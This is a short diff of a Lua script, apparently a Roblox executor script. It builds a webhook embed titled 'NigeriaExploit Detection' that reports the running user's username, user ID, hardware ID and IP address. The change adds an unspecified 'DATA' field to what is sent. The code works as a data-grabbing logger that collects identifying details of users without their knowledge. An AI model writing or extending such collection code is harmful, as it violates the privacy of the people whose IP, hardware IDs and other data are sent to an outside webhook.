@@ -39,8 +39,8 @@ local function createWebhookData()
         embeds = {{
             title = "⚠️ NigeriaExploit Detection",
             description = string.format(
-                "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s",
-                Username, DisplayName, UserId, HWID, GameName, executor, GetIp
+                "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n**DATA:** %s",
+                Username, DisplayName, UserId, HWID, GameName, executor, GetIp, GetData
             ),
             thumbnail = {
                 url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
